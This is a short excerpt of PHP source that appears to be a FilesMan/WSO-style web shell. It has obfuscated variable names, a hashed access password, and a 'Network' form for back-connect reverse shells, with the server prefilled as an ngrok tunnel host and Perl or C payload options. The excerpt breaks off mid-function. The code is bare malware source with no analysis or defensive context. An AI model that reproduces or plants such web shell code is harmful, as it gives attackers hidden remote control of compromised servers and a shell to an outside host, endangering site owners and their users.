...
//-----------------Password---------------------
$▛ = "bd1839a2fcfcb41ccc4942ca617cc2a5";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function actionNetwork() {
	...
	Server: <input type='text' name='server' value='0.tcp.ap.ngrok.io'> Port: <input type='text' name='port' value=''> Using: <label><select name='using'><option value='bcp'>Perl</option><option value='bcc'>C</option></select></label> <input type=submit value='submit'>
	</form><br>";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
